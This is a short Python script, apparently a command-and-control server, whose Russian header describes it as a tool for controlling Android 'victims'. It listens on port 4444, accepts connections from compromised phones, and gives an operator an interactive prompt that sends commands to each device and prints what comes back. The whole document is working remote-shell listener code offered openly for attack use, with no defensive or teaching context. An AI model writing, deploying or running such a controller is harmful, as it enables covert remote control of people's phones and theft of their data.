# android_c2.py — сервер для управления Android-жертвами
import socket, threading

def handle_device(conn, addr):
    print(f"[+] Android подключился: {addr}")
    print(conn.recv(1024).decode())
    while True:
        try:
            cmd = input("android> ")
            conn.send(cmd.encode())
            print(conn.recv(4096).decode())
        except: break
    conn.close()

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(5)
print("[*] Жду Android-устройства...")
while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_device, args=(conn, addr)).start()
